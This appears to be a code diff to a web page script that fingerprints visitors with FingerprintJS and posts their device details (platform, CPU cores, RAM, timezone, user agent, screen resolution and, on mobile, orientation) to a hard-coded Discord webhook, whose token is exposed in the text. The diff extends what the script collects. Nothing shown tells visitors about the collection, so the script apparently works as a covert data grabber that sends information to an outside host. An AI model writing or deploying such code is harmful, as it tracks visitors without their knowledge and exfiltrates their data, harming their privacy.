@@ -28,6 +28,10 @@ import('https://openfpcdn.io/fingerprintjs/v3')
       };
       const screenResolution = `${window.screen.width}x${window.screen.height}`;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const additionalInfo = /Mobi|Android|iPhone|iPad/i.test(ua) ? {
+        "🎮 Orientación de pantalla": window.orientation ? `${window.orientation}°` : "Desconocido",
+        "📐 Resolución de Pantalla": screenResolution
+      } : {};
       const url = 'https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z';
       fetch(url, {
         method: 'POST',
@@ -44,8 +48,10 @@ import('https://openfpcdn.io/fingerprintjs/v3')
               { name: '🖥️ Plataforma', value: hw.platform, inline: true },
               { name: '🧠 Núcleos CPU', value: String(hw.cores), inline: true },
               { name: '📦 RAM Estimada', value: hw.ram, inline: true },
-              { name: '📐 Resolución de Pantalla', value: screenResolution, inline: true },
               { name: '🕰️ Zona Horaria', value: timezone, inline: true },
+              ...Object.entries(additionalInfo).map(([key, value]) => ({
+                name: key, value, inline: true
+              })),
               { name: '🖥️ User Agent', value: ua, inline: false }
             ]
           }]
